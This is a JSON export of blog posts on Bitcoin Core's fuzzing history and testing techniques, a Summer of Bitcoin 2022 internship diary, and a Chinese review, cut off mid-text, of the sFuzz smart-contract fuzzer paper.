[{"categories":["Research"],"contents":"Abstract Bitcoin is a widely used distributed system that is time-tested and recognized to be secure. However, most of the existing research focus on its theoretical security model, while ignoring the possible vulnerabilities in its software implementation. This paper will review how fuzzing, an increasingly popular automated vulnerability detection method, has been used in practice and refined stage by stage by Bitcoin Core developers. In addition, this paper will describe recent work published in ICSE 2022 that analyzes three different software testing techniques and summarizes their practical effects when applied to Bitcoin Core.\nKeywords: fuzzing, software testing, Bitcoin\nIntro Bitcoin is one of the most prominent distributed software systems in the world, and a key part of a potentially revolutionary new form of decentralized financial (DeFi) tool, cryptocurrency. Due to its distributed nature, Bitcoin in some sense is the sum of the operations of the code executed by many independent nodes rather than the original software created by Satoshi Nakamoto. There are several different implementations of Bitcoin written in various programming languages, like btcd, bcoin, and bitcoin-s. However, Bitcoin Core, written in C++, is the reference implementation of the Bitcoin system, meaning that it is the authoritative reference on how each part of the technology should be implemented. To a significant degree, the code of Bitcoin Core is Bitcoin, so we may mix these two terms in this paper. The main Bitcoin Core repo on GitHub has over 64,000 stars and has been forked more than 32,000 times.\nBecause of Bitcoin\u0026rsquo;s fame and the high monetary value, the Bitcoin protocol and its implementations are a high-value target for hackers. Though many works have been done to analyze the security model of Bitcoin, most of them focused on theory but ignore software implementation. This paper will describe how Bitcoin Core, as a popular open-source software (OSS), uses fuzzing to secure its codebase against potential vulnerabilities. Our main contributions are:\n We present the first insight into the long-term evolution of Bitcoin Core\u0026rsquo;s fuzzing infrastructure by investigating every footprint left by developers on GitHub We describe the survey presented at ICSE 2022 about different software testing techniques and how they improve Bitcoin\u0026rsquo;s fuzzing effect  Background Among the many software testing techniques available today, fuzzing has remained highly popular due to its conceptual simplicity, its low barrier to deployment, and its vast amount of empirical evidence in discovering real-world software vulnerabilities. At a high level, fuzzing refers to a process of repeatedly running a program with generated inputs that may be syntactically or semantically malformed. It is necessary to provide background on coverage-guided fuzzing and OSS-Fuzz.\nCoverage-guided Fuzzing Coverage-guided fuzzing (CGF), implemented by tools such as AFL, libFuzzer, and honggfuzz, is a popular bug detection method. CGF uses genetic search to find inputs that maximize code coverage. Algorithm 1 describes CGF at a high level. The algorithm maintains a pool of Inputs and the TotalCoverage of program $p$ on Inputs. The user provides seed inputs to instantiate Inputs. The fuzzer repeatedly picks an input $i$ from the pool of Inputs and applies a mutation (e.g., increment, bit flip, or user-defined mutations) to produce $i′$. The fuzzer then executes program $p$ on mutated input $i′$ to gather the coverage of program $p$ on $i′$ and detect any error, such as crashes, assertion violations, timeouts, memory leaks, etc. If $i′$ does not trigger an error and discovers new coverage that is not previously seen in TotalCoverage, then add $i′$ to Inputs and update TotalCoverage. By finding inputs that cover new code, CGF aims to test as much of the program as possible.\nFuzzers need an entrypoint into the program to provide test inputs; such an entrypoint is often called a fuzz target. libFuzzer-style fuzz targets — which AFL and honggfuzz also support and OSS-Fuzz uses — are functions that take in fuzzer-generated arbitrary bytestream input, transform the input to program-usable input data if needed, and execute the program under test with the input.\nContinuous Fuzzing and OSS-Fuzz Continuous fuzzing uses fuzzing as part of a continuous testing strategy to find regressions as software evolves. Several organizations incorporate fuzzing as part of their quality assurance strategy or offer tools that provide continuous fuzzing as a service.\nOSS-Fuzz is Google’s continuous fuzzing service for open source software projects, which combines modern fuzzing techniques with scalable, distributed execution. OSS-Fuzz uses ClusterFuzz, Google’s scalable fuzzing infrastructure as its back-end. Figure 1 illustrates OSS-Fuzz’s workflow. Developers in a participating OSS project write fuzz targets and provide instructions for building the software. OSS-Fuzz continuously builds the software and uploads it to ClusterFuzz. ClusterFuzz finds fuzz targets and uses the coverage-guided fuzzers AFL, libFuzzer, and honggfuzz to fuzz the software. Upon detecting a bug, ClusterFuzz checks whether the bug is a duplicate of any previously found bugs, minimizes the bug inducing input, and bisects the range of commits in which the regression occurred. If the bug is not a duplicate, then ClusterFuzz files a bug report on Monorail, an issue tracker. ClusterFuzz periodically verifies whether any previously found bugs are fixed; if so, OSS-Fuzz updates fixed bugs’ report.\nBitcoin Fuzzing Infrastructure History Stage 1: Proof of Concept (2013-2016) Neither Bitcoin nor fuzzing has a long history. The first piece of code about fuzzing was introduced by Gavin Andresen in PR#3173, which just added a simple protected method in the CNode class. All it can do is randomly corrupt 1-of-N sent messages. It was understandably primitive, since AFL, the widely-used generic fuzzer, does not even exist until 2 months later in 2013.\nThree years later in 2016, Patrick Strateman first attempted to bring a simple fuzzing framework to Bitcoin in PR#7940, but he did not make the code merged. Luckily, laawj resurrect pstratem\u0026rsquo;s fuzzing framework as part of Bitcoin\u0026rsquo;s test code in PR#9172. This simple fuzzing framework test deserialization by reading input from stdin, which makes it compatible with AFL.\nStage 2: Standardized Fuzzing (2017 - 2018) In May 2017, Google announced rewards for open source projects that integrate fuzz targets into OSS-Fuzz. As a quick response, contributor practicalswift proposed making Bitcoin ready for it in Issue#10364, where developers made lots of discussions. He also added two more tests for deserialization routines used by ProcessMessage in PR#10409, brought libFuzzer support in PR#10440, and made fuzzing ~200x faster by enabling AFL\u0026rsquo;s deferred forkserver and persistent mode in PR#10415. Thanks to his efforts, Bitcoin has made big progress in setting up fuzz testing suites, but that is still not enough for production due to low code coverage. Besides, OSS-Fuzz\u0026rsquo;s policy about short bug disclosure period is not agreed upon by all members.\nAnother interesting thing that happened in 2017 is that Guido Vranken, known for fuzzing cryptographic libraries, offered his 13 different fuzzers implemented as libFuzzer fuzz targets in Issue#11045. However, the existing simple fuzzer of Bitcoin is just a single binary that decides on the first few bits of the buffer what target to pick. This ineffective approach of switching between tests based on input is criticized for confusing the fuzzer with unnecessary re-use of fuzzing inputs, making it quite hard to see which fuzzers are still hitting new paths. It was not until Jan 2019 that MarcoFalke managed to build fuzz targets into separate executables in PR#15043 by using different C preprocessor macros. He also renamed test/fuzz/test_bitcoin_fuzzy.cpp to test/fuzz/deserialize.cpp in PR#15399, which allows more fuzz targets that test different parts of Bitcoin code to be added in the future.\nStage 3: Scaling with the community (2019-2020) 2019 witnessed huge growth of Bitcoin\u0026rsquo;s fuzzing infrastructure. To make fuzzing easily integrated with CI tests, MarcoFalke added test_runner.py, a script which is still used now, in PR#15295. He also simplified Makefile in PR#15504 by linking against BasicTestingSetup, which was shared with unit tests. After that, practicalswift and he made lots of contribution to add more fuzzing harness for other part of Bitcoin\u0026rsquo;s code, of which PR#17009 is the first newly added fuzz harness.\nThe increased number of fuzz targets also brings several downsides as discussed in Issue#20088. Having many targets not only slowing down build process with coslty disk space and CPU time, but also makes writing new fuzz tests unnecessarily hard. In Decemeber 2020, MarcoFalke made a huge refactoring with change of 100 files to link all targets once in PR#20560. By specifying environment variables, different fuzz targets can bde executed using only one binary. He proved that the single binary approach does not effect the fuzzing performance by showing benchmark results. So the basic architecture has not changed since then.\nStage 4: Embracing OSS-Fuzz (2021 - Present) In May 2021, Bitcoin Core made its initial integration into OSS-Fuzz. Till May 2022, 34 pull requests have been submitted to OSS-Fuzz for further improvement.\nAs Bitcoin Core participates in Google\u0026rsquo;s OSS-Fuzz program, there is a dashboard of publicly disclosed vulnerabilities. Generally, vulnerabilities are disclosed as soon as possible after they are fixed to give users the knowledge they need to be protected. However, because Bitcoin is a live P2P network, and not just standalone local software, not every issue may be disclosed within Google\u0026rsquo;s standard 90-day disclosure window if a partial or delayed disclosure is important to protect users or the function of the network.\nBy reviewing the history of Bitcoin\u0026rsquo;s fuzzing evolution, we can learn that it is not easy for Bitcoin, which is probably the most running distributed software in the world, to build its fuzzing infrastructure and integrate with OSS-Fuzz. Maintainers have to take many factors into consideration before accepting code changes.\nCase Study of Fuzz Target process_message Fuzz target process_message is introduced in PR#17989, which enables high-level fuzzing of the P2P layer. All code paths reachable from this fuzzer can be assumed to be reachable for an untrusted peer so it worth taking a look at.\nTo achieve optimal results when using coverage-guided fuzzing, there are both one general fuzzing binary (process_message) which handles all messages types and specialized fuzzing binaries per message type (process_message_addr, process_message_block, process_message_blocktxn , etc.) The reason to have all message types in one fuzzers is to allow auto-detection bring auto-detection and thus fuzzing of newly introduced messages types without updating the fuzzer. The reason to have also have per-message-type fuzzers is largely for the same reason that we have one fuzzing binary per deserialization: to make it relatively easier for coverage guided fuzzers to reach deep.\nvoid fuzz_target(FuzzBufferType buffer, const std::string\u0026amp; LIMIT_TO_MESSAGE_TYPE) { FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size()); ConnmanTestMsg\u0026amp; connman = *static_cast\u0026lt;ConnmanTestMsg*\u0026gt;(g_setup-\u0026gt;m_node.connman.get()); TestChainState\u0026amp; chainstate = *static_cast\u0026lt;TestChainState*\u0026gt;(\u0026amp;g_setup-\u0026gt;m_node.chainman-\u0026gt;ActiveChainstate()); SetMockTime(1610000000); // any time to successfully reset ibd chainstate.ResetIbd(); const std::string random_message_type{fuzzed_data_provider.ConsumeBytesAsString(CMessageHeader::COMMAND_SIZE).c_str()}; if (!LIMIT_TO_MESSAGE_TYPE.empty() \u0026amp;\u0026amp; random_message_type != LIMIT_TO_MESSAGE_TYPE) { return; } CNode\u0026amp; p2p_node = *ConsumeNodeAsUniquePtr(fuzzed_data_provider).release(); connman.AddTestNode(p2p_node); g_setup-\u0026gt;m_node.peerman-\u0026gt;InitializeNode(\u0026amp;p2p_node); FillNode(fuzzed_data_provider, connman, *g_setup-\u0026gt;m_node.peerman, p2p_node); const auto mock_time = ConsumeTime(fuzzed_data_provider); SetMockTime(mock_time); // fuzzed_data_provider is fully consumed after this call, don't use it CDataStream random_bytes_data_stream{fuzzed_data_provider.ConsumeRemainingBytes\u0026lt;unsigned char\u0026gt;(), SER_NETWORK, PROTOCOL_VERSION}; try { g_setup-\u0026gt;m_node.peerman-\u0026gt;ProcessMessage(p2p_node, random_message_type, random_bytes_data_stream, GetTime\u0026lt;std::chrono::microseconds\u0026gt;(), std::atomic\u0026lt;bool\u0026gt;{false}); } catch (const std::ios_base::failure\u0026amp;) { } { LOCK(p2p_node.cs_sendProcessing); g_setup-\u0026gt;m_node.peerman-\u0026gt;SendMessages(\u0026amp;p2p_node); } SyncWithValidationInterfaceQueue(); g_setup-\u0026gt;m_node.connman-\u0026gt;StopNodes(); }  The basic idea is simple:\n On initialization, create a few blocks On each input, create a few random network peers Then receive random messages from those random peers  Fuzz Trophies A collection of bugs found by developers via fuzzing can be found at https://github.com/bitcoin-core/bitcoin-devwiki/wiki/Fuzz-Trophies. Some of them are actually exploitable vulnerabilities. For instance, CVE-2017-18350 is a buffer overflow vulnerability which allows a malicious SOCKS proxy server to overwrite the program stack on systems with a signed char type (including common 32-bit and 64-bit x86 PCs). The vulnerability was introduced in 2012 and kept unknown until practicalswift used fuzzing to find it and disclosed it to security team in 2017. PR#19203 added a regression fuzz harness for it.\nSoftware Testing Techniques To Improve Fuzzing Although Bitcoin Core has put much effort into fuzzing, it seemed that the fuzzing was stuck: neither code coverage nor found bugs were increasing with additional fuzzing time. This is a common phenomenon called saturation when fuzzing software. That is, at first a particular fuzzer applied to a system will tend to continuously increase both coverage and discovery of previously-unknown bugs. But, at some point, the number of new bugs found by the fuzzer drops off, eventually approaching zero.\nThe underlying reason for saturation is that any fuzzer can explore a space of generated tests determined by a complex probability distribution. Some bugs lie in the high-probability portion of this space, and other bugs lie in very low probability or even zero probability parts of the space.\nGroce, Alex, et al. present their work Looking for Lacunae in Bitcoin Core\u0026rsquo;s Fuzzing Efforts at ICSE 2022, which describes how researchers of Chaincode Labs applied various kinds of techniques to solve the problem. This section is a paraphrase of their work.\nEnhancing Diversity by Ensemble fuzzing Ensemble fuzzing is an approach that recognizes the need for diverse methods for test generation, at least in the context of fuzzing; using multiple fuzzers to seed each other and avoid saturation is a core motivation for ensemble fuzzing. Inspired by ensemble methods in machine learning, ensemble fuzzing runs multiple fuzzers, and uses inputs generated by each fuzzer to seed the other fuzzers.\nNote that in one important sense Bitcoin Core is using ensemble fuzzing, in that OSS-Fuzz runs multiple fuzzers, including libFuzzer, AFL, and Honggfuzz) with different compilation flags and sanitizers. Additionally, the Bitcoin Core team has servers running different fuzzers. All of these are coordinated via the qa-assets repository to which our Eclipser-based tests were added. This is, however, a more manual and less controlled process than true ensemble cross-seeding on-the-fly during a fuzzing campaign, and there are suggestions that a well-chosen coordination strategy can significantly improve ensemble effectiveness.\nIncreasing Variance by Swarm Fuzzing Swarm testing is a method for improving test generation that relies on identifying features of tests, and disabling some of the features in each test. For instance, if features are API calls, and we are testing a stack with push, pop, top, and clear calls, a non-swarm random test of any significant length will contain multiple calls to all of the functions. In swarm testing, however, for each test some of the calls (with a certain probability for each call) will be disabled, but different calls will be disabled for each generated test. This produces less variance between calls within tests, but much more variance between tests. Practically, in the stack example, it will enable the size of the stack to grow much larger than it ever would have any chance of doing in non-swarm testing, due to some tests omitting pop and/or clear calls.\nThe picture above shows the basic logic of swarm testing. There is a 1,000×1,000 array of pixels, where each 10×10 block represents a sequence of 100 function calls in an API sequence test. Each pixel is a call to a function, and the calls to five different functions are coded by color (black, white, red, green, and blue).\nThe top half of the figure is what traditional sequence generation will tend to do in such a setting, assuming each call is given equal probability: every test will look like every other test. The details will vary, but at a certain level the arrangement will be very homogeneous; in fact, the eye can’t tell where one test ends and another begins! Let’s call this the kitchen-sink approach to testing: every test generated throws in everything it can, at least potentially.\nThe bottom half of the figure represents swarm testing. In swarm testing, function calls in each test are not always included but potentially picked with a probability. On average, the diversity between calls within each test is much worse for the swarm portion of the testing. However, it is easy to tell tests apart, with practical consequences. Behind the visually obvious impact of swarm testing, there is simple statistical reality. While it is possible for a single method to be called 100 times using the kitchen-sink approach, the most instances of any single call we observed was 37. For the swarm tests, of course, each method was called more than 50 times (and in fact 100 times) in multiple tests.\nSwarm testing probably works because most coverage targets, and most bugs, likely rely on including some test features (e.g., function calls), which can be designated triggers, but also are prevented by other function calls (designated suppressors).\nIn Issue#22628, Alex Groce tried swarm fuzzing on fuzz target process_messages for four weeks but he found the new coverage generated was minimal. Because there is a fuzz target process_message which only generate one type of message when running. The ability to run process_message with a single message type and the frequent introduction of the resulting inputs into process_messages (and the generic, unconstrained process_message fuzzing) probably, in a less automated way, also achieves many of the benefits of swarm testing itself: mixing complex lengthy runs of a single type or mix of types. It does show that some advanced fuzzing strategies can be anticipated by particularly savvy and capable fuzz engineers, willing to directly use raw fuzzing data, and write tools to support that kind of low-level hand-tuning of fuzz corpuses.\nOracle Problem and Mutation Testing Many efforts have been done to generate various test input that could reach more code. However, sometimes code coverage is already high enough and no bugs could be found because fuzzers actually know nothing about correctness. What is a bug? That is the question to fuzzers.\nThe only kind of bug that can be found easily without additional work is program crash, which is also the only behavior that AFL considers to be a bug. But programs can do bad things other than crash. For instance, a hello-world program will never crash, but it always fail to do the expected jobs.\nIn software testing, we use oracle to describe a source of insight into whether a program run did what it was supposed to do. The general term for a way to decide if a particular execution of a program is “good” or “bad” (if a test fails or passes, for example) is oracle.\nAdding assert statements is one well-established way to make programs have oracle power. An assert just checks that something that ought to be true at runtime is true, and crashes the program if it isn’t. Another way to get more crashes automatically is to compile a program with a sanitizer. For example when using clang, adding -fsanitize=address will make the program crash if it performs a variety of unsafe memory operations that might otherwise not cause a problem, or at least not an obvious problem leading to a crash.\nMutation testing, compared with coverage, can provide more valuable information on oracle power. The basic idea of mutation testing is very simple: add new fake bugs by making small changes to the program then grade the testing effort according to how many bugs can be found.\nTo perform mutation analysis on Bitcoin, researchers generated mutations for code in the tx_verify.cpp file. Fuzzing covers 96 of 98 lines of code, 8 of 8 functions, and 74 of 102 branches for this file, guaranteeing that mutation testing will not primarily reflect missing coverage. Comparing coverage to that for functional testing, the fuzz testing has very slightly lower branch coverage, but the numbers are almost identical (72.5% vs. 73%), and the fuzz testing covers different branches than the functional testing. The missing lines are different for functional and fuzz testing as well. Figure 2 summarizes mutation analysis of the file tx_verify.cpp, which is critical to checking transactions for correctness.\nFuzzing adds only two unique mutant kills beyond those produced by the functional testing. This raises the question: why fuzz if we already have functional tests with high code coverage? The answer lies in the fact that, even in the presence of such high-quality tests, fuzzing uncovers subtle bugs that functional tests designed by humans will almost never detect, e.g. https://github.com/bitcoin/bitcoin/issues/22450. A major purpose of fuzzing is to address limits in more traditional functional testing, where known inputs are paired with expected behavior. While functional or unit testing is very powerful, the kinds of bugs found in vulnerabilities often involve the kind of inputs that don’t appear in normal unit/functional tests, as shown by the success of fuzzing and security audits. Fuzzing is not a replacement for functional/unit tests, and functional/unit tests are not a replacement for fuzzing too.\nConclusion and Future Work One conclusion is that the most effective way to improve fuzzing at present might be not to focus on covering the code and state space, but to focus on increasing the oracle power of all Bitcoin Core testing. Arguably, the greatest weakness of traditional code coverage is that it focuses too much attention on the input side of testing and too little on the oracle side, which is easier for even dedicated testing efforts to neglect in the pursuit of covering every branch and path.\nBitcoin Core is a open source software, which means everyone can contribute to its fuzzing infrastructure. Luckily, I got selected as one of the 83 students that will participate in Summer of Bitcoin 2022. Under the guidance of MarcoFalke, I will add a specific fuzz target for orphan transaction handling, which was the source of several DoS attack vectors in the past. By contributing to Bitcoin Core, I can learn a lot about transaction relay in the Bitcoin P2P network and hopefully find potential security issues in the code.\nAcknowledgements Thanks to Marco Falke and all the other Bitcoin developers for their excellent demonstration of open source collaboration, which was the basis for my research into the evolution of Bitcoin development.\nThanks to the Summer of Bitcoin event organizing committee and sponsors like Chaincode Labs for guiding and supporting students in bitcoin development.\nThanks to Professor Alex Groce of Northern Arizona University for his contributions to software security analysis and fuzzing. His papers and blogs are really informative and lively.\nReference Groce, Alex, and Kush Jain. 2022. “Looking for Lacunae in Bitcoin Core’s Fuzzing Efforts.” International Conference on Software Engineering, 2.\n“Bug Disclosure Guidelines.” n.d. OSS-Fuzz. https://google.github.io/oss-fuzz/getting-started/bug-disclosure-guidelines/.\nChen, Yuanliang, Yu Jiang, Fuchen Ma, Jie Liang, Mingzhe Wang, Chijin Zhou, Xun Jiao, and Zhuo Su. 2019a. “EnFuzz: Ensemble Fuzzing with Seed Synchronization Among Diverse Fuzzers.” In USENIX Security Symposium.\n“EnFuzz: Ensemble Fuzzing with Seed Synchronization Among Diverse Fuzzers.” In 28th USENIX Security Symposium (USENIX Security 19), 1967–83. Santa Clara, CA: USENIX Association. https://www.usenix.org/conference/usenixsecurity19/presentation/chen-yuanliang.\n“ClusterFuzz.” n.d. ClusterFuzz. https://google.github.io/clusterfuzz/.\n“CVE-2012-3789.” n.d. CVE-2012-3789 - Bitcoin Wiki. https://en.bitcoin.it/wiki/CVE-2012-3789.\nDietterichl, Thomas G. 2002. “Ensemble Learning.” In The Handbook of Brain Theory and Neural Networks, edited by M. Arbib, 405–8. MIT Press.\nFioraldi, Andrea, Dominik Maier, Heiko Eißfeldt, and Marc Heuse. 2020. “{AFL++}: Combining Incremental Steps of Fuzzing Research.” In 14th USENIX Workshop on Offensive Technologies (WOOT 20).\nGaray, Juan, Aggelos Kiayias, and Nikos Leonardos. 2015. “The Bitcoin Backbone Protocol: Analysis and Applications.” In Annual International Conference on the Theory and Applications of Cryptographic Techniques, 281–310. Springer.\nGoogle, Project Zero team at. 2015. Feedback and Data-Driven Updates to Google’s Disclosure Policy. https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html.\nGroce, Alex, Chaoqiang Zhang, Mohammad Amin Alipour, Eric Eide, Yang Chen, and John Regehr. 2013. “Help, Help, i’m Being Suppressed! The Significance of Suppressors in Software Testing.” In 2013 IEEE 24th International Symposium on Software Reliability Engineering (ISSRE), 390–99. https://doi.org/10.1109/ISSRE.2013.6698892.\nGroce, Alex, Chaoqiang Zhang, Eric Eide, Yang Chen, and John Regehr. 2012. “Swarm Testing.” In Proceedings of the 2012 International Symposium on Software Testing and Analysis, 78–88. ISSTA 2012. New York, NY, USA: Association for Computing Machinery. https://doi.org/10.1145/2338965.2336763.\nGroce, Posted byAlex. 2021. “Oracles and Mutation Testing: Adding Bugs to Code for Fun and Profit.” How to Test It. https://howtotestit.wordpress.com/2021/03/31/oracles-and-mutation-testing-adding-bugs-to-code-for-fun-and-profit/.\n“Honggfuzz.” n.d. Honggfuzz. https://honggfuzz.dev/.\nImtiaz, Muhammad Anas, David Starobinski, and Ari Trachtenberg. 2020. “Characterizing Orphan Transactions in the Bitcoin Network.” In 2020 IEEE International Conference on Blockchain and Cryptocurrency (ICBC), 1–9.\nNakamoto, Satoshi. 2008. “Bitcoin Whitepaper.” URL: Https://Bitcoin. Org/Bitcoin. Pdf-(: 17.07. 2019).\n“Oss-Fuzz: Five Months Later, and Rewarding Projects.” n.d. Google Open Source Blog. https://opensource.googleblog.com/2017/05/oss-fuzz-five-months-later-and.html.\nPapadakis, Mike, Marinos Kintis, Jie Zhang, Yue Jia, Yves Le Traon, and Mark Harman. 2019. “Chapter Six - Mutation Testing Advances: An Analysis and Survey.” In, edited by Atif M. Memon, 112:275–378. Advances in Computers. Elsevier. https://doi.org/https://doi.org/10.1016/bs.adcom.2018.03.015.\nRegehr, John. n.d. The Saturation Effect in Fuzzing. https://blog.regehr.org/archives/1796.\nSerebryany, Kosta. 2016. “Continuous Fuzzing with Libfuzzer and Addresssanitizer.” In 2016 IEEE Cybersecurity Development (SecDev), 157–57. IEEE.\nSerebryany, Kostya. 2017. “OSS-Fuzz - Google’s Continuous Fuzzing Service for Open Source Software.” Vancouver, BC: USENIX Association.\nSompolinsky, Yonatan, and Aviv Zohar. 2016. “Bitcoin’s Security Model Revisited.” arXiv Preprint arXiv:1605.09193.\n","date":"2022-05-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/bitcoin-fuzz/","tags":["Paper","Bitcoin","Fuzzing"],"title":"Fuzzing Evolution: How developers make Bitcoin more secure"},{"categories":["Experience"],"contents":"What is Summer of Bitcoin?\n a global, online summer internship program focused on introducing university students to bitcoin open-source development and design\n When I started to write my proposal for it, there was only one week to go before the deadline. Luckily, my experience with OSS-Fuzz and my efforts paid off. I am proud to become one of the 83 students who will participate in Summer of Bitcoin 2022 and contribute to Bitcoin Core under the guidance of Marco Falke.\nOnboarding to Bitcoin Core After a Jitsi meeting with my mentor, I get some resources.\nhttps://github.com/bitcoin-core/bitcoin-devwiki/wiki/Fuzz-Trophies\nhttps://github.com/bitcoin/bitcoin/blob/master/doc/developer-notes.md\nhttps://github.com/chaincodelabs/onboarding-to-bitcoin-core\nhttps://github.com/chaincodelabs/bitcoin-core-onboarding/blob/main/1.0_bitcoin_core_architecture.asciidoc\nWeek 1 Reading material: https://chaincode.gitbook.io/seminars/bitcoin-protocol-development/welcome-to-the-bitcoin-protocol\nbitcoin-paper-errata-and-details describes known problems in Satoshi Nakamoto\u0026rsquo;s whitepaper and terminology changes in Bitcoin\u0026rsquo;s implementation.\nBitcoin’s Academic Pedigree is a complete survey tracing the origins of the key ideas that Nakamoto applied to Bitcoin. By reading this, we can zero in on Nakamoto\u0026rsquo;s true leap of insight—the specific, complex way in which the underlying components are put together\nAfter reviewing The Incomplete History of Bitcoin Development, I admire the way Nakamoto and his collaborators developed Bitcoin sustainably. If I\u0026rsquo;d Known What We Were Starting emphasizes the trustless nature of Bitcoin, which is forgotten by many short-lived altcoins.\nMoreover, I have learned a lot about Bitcoin\u0026rsquo;s security model by diving deep into the assumptions and guarantees.\nGlossaries I have learned:\n full node, pruned node, SPV node CoinJoin Sybil attack selfish attack checkpoints  Scaling Bitcoin: A trip to the moon requires a rocket with multiple stages describes the limitation of Bitcoin\u0026rsquo;s capacity and scalability, which makes it inefficient for payment. Bitcoin\u0026rsquo;s primary distinguishing values are monetary sovereignty, censorship resistance, trust cost minimization, international accessibility/borderless operation, etc. So it doesn\u0026rsquo;t need to compete with Visa/Mastercard to succeed. The potential of scalable transactions may be achieved by upper layers such as Lightning Network.\nDo you believe that bitcoin needs to be competitive with Visa/Mastercard to succeed?\nThe article has explained the reasons why Bitcoin itself is not going to compete with Visa/Mastercard from a technical perspective.\nIf we think from a sociological perspective, Bitcoin cannot replace traditional Visa/Mastercard because of its decentralized nature. The real world runs in a centralized way where the banks are supervised by the governments. Even Bitcoin itself is mostly traded in centralized cryptocurrency exchanges such as Binance, which need approval from regulators to operate. It will be suicide for Bitcoin to become more centralized in order to beat Visa/Mastercard.\nTo conclude, I think it is difficult for Bitcoin to compete with Visa/Mastercard. But it does not have to be used for daily transactions to succeed. It can be a kind of investment just like gold.\n","date":"2022-05-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/summer-of-bitcoin/","tags":["Bitcoin","Fuzzing","Open-Source"],"title":"My Experience in Summer of Bitcoin 2022"},{"categories":["论文"],"contents":"前言 本文将对 ICSE 2020 会议论文 sFuzz: An Efficient Adaptive Fuzzer for Solidity Smart Contracts 进行解读。这篇论文的主要研究内容是综合运用 AFL 的策略和自适应方法来 fuzz 智能合约，并开发为一整套工具，其价值在于这种互补的策略使得 fuzz 更加高效，且达到了较高的代码覆盖率，可以发现更多漏洞。\n论文地址：https://dl.acm.org/doi/10.1145/3377811.3380334\n源码地址：https://github.com/duytai/sFuzz\n论文作者：Tai D. Nguyen, Long H. Pham, Jun Sun, Yun Lin, Quang Tran Minh\n正文 研究背景 现如今，智能合约作为图灵完备的程序在区块链上以分布式自治信任的方式执行，在给各行业带来革命性改变的同时，也有着极大的安全隐患。\n和传统程序不同，智能合约一旦部署上链就无法轻易更改，这使得漏洞具有极强的危害性，近年来对以太坊智能合约的攻击日益增多，其中最著名的便是发生于 2016 年的 The DAO Attack，直接导致了以太坊的硬分叉与社区的分裂。\n本文主要关注自动化测试技术用于发掘智能合约中的漏洞，必须解决以下三个问题：\n 如何运行测试用例 如何生成测试用例 the oracle problem  这里需要解释一下 oracle 的概念，整个以太坊系统可以看作分布式的状态机，为了保证达成共识，避免状态的不一致，链上所有操作都是确定性 (deterministic) 的。但现实世界就是充满不确定性的，oracle 就是和链上链下沟通的中间件，而 oracle 本身又是中心化的，现实世界中的软件安全问题都会在其身上体现，具体有哪些安全问题本文并未详细说明。最早关于以太坊智能合约攻击的研究参见 A Survey of Attacks on Ethereum Smart Contracts SoK，其列举了如 Gasless Send, Reentrancy 等漏洞，详见下表\n针对智能合约的自动化测试之前已经有一些研究，比如 ContractFuzzer 和 Oyente 分别用模糊测试 (fuzzing) 和符号执行 (symbolic execution) 技术来进行自动挖掘。而本文的工作结合了这两种互补的技术，并且使用了一种高效的自适应策略来选取 fuzzing 所用的种子 (seeds) 以解决 AFL-based fuzzing 难以覆盖具有严格进入条件的分支这一问题。\n样例展示 上图为一个简单的猜数字游戏合约程序，调用函数 start_quiz_game 以设置问题和答案，调用函数 Try 来支付 100 finney 并猜测数字，如果答案正确则会向调用者转帐。但该合约程序存在 Gasless Send 漏洞，可能导致调用者的 fallback function 被执行，从而引发 out-of-gas exception。\n要挖掘合约中的漏洞，首先要建立一个区块链网络，配置相应的地址和数额，将合约部署在某一地址上，生成 test case（即一系列交易）来生成参数并调用函数 start_quiz_game 和 Try，但 AFL 随机生成数据的策略很难满足第二个条件，即仅有 1/2^256 的概率生成值为 100 的 uint 数据，所以很难覆盖到这一分支。sFuzz 使用了一种自适应的策略作为补充，定量计算 seed 与分支条件之间的距离，从而使 seed 能越来越接近满足分支条件。这一例子是仅包含一个 just-missed 分支的最简单情形，包含多个分支的 multi-objective 场景也能适用。\n算法细节 基于反馈的 fuzzing 主要思想就是将 test generation problem 变为 optimization problem,使用某种形式的反馈作为 objective function 来解决最优化问题，而 sFuzz 策略的自适应性在于其会根据反馈来改变 objective function，整体上看属于遗传算法，如下图所示。\nInit Polulation 初始化配置，生成多个 test cases（即交易函数调用），在为参数生成随机值时需要注意考虑变长的类型如数组，会先在 [0,255] 内确定个数，再对应生成每个元素的随机值。每个 test case 都会编码成如下 bit vector 的形式\nFit To Survive 适者生存阶段，通过设定如下距离函数来挑选新 seeds\n该阶段算法如下：\n策略受 search-based software testing (SBST) 启发但又更加高效，\nCrossover and Mutation 这一阶段将之前生成的 seeds 进行变异，采用了 AFL 中的所有变异策略，还针对智能合约引入了一些如下新策略：\n检查变异后的数据是否 valid，丢弃 invalid 和重复的结果。为了减少无效工作也同样采用了 AFL 中的启发式方法，比如当对某一块数据进行 WalkingByte 变异操作没有覆盖任何新分支则之后不再变异该块数据。\n具体实现 编写了约 4347 行 C++ 代码，主要有三个组件：\n runner 管理 test case 的执行  获取智能合约的字节码及其 ABI（application binary interface）作为输入，并生成用于分析 ABI 的 bash 脚本 设置用于部署智能合约的区块链网络，并创建一个随机地址池，部署 normal attacker 和 reentrancy attacker   libfuzzer 解决 test 的生成问题  使用前文所述策略选择性地生成 test cases 首先在运行时构建 CFG，因为在 fuzz 之前静态构建是很困难的，EVM 中分支跳转由操作码 jumpi 实现，其操作数是程序动态执行时的目标 PC 值，只有模拟整个栈才能获知，但代价太高。因此在 fuzz 过程中构建 CFG，当执行到 jumpi 时再记录目标并相应作为新节点添加到 CFG 中 。 跳过不改变状态的 view, pure, constant 函数   liboracles 解决 oracle problem  通过 EVM 提供的 hook 机制以监测 test case 的执行 可能存在 false positive    效果验证 Efficient sFuzz 平均每秒可执行 208 个 test cases，明显比 ContractFuzzer 和 Oyente 高效，因为 ContractFuzzer 模拟整个区块链网络，而 sFuzz 仅模拟和智能合约漏洞相关的细节，且其基于 Node.js 和 Go，相比 C++ 低效。而 Oyente 采用符号执行，比 sFuzz 运行得更慢更是理所应当。\nEffective 测量分支覆盖率较困难，因此以覆盖到不同的分支数作为指标。\n绝大部分情况下 sFuzz 比 ContractFuzzer 更有效，少数例外也是由于 sFuzz 不改变状态的函数故而这些函数中的分支未被统计，而且 ContractFuzzer 生成 invalid 的 test cases 根本不符合编译器生成的 mandatory constraints 故而覆盖到了多余的分支。\nOyente 在绝大部分情况下覆盖了更多的分支，因为符号执行可以满足几乎所有分支条件，能发现 integer overflow，但现实中许多 state variable 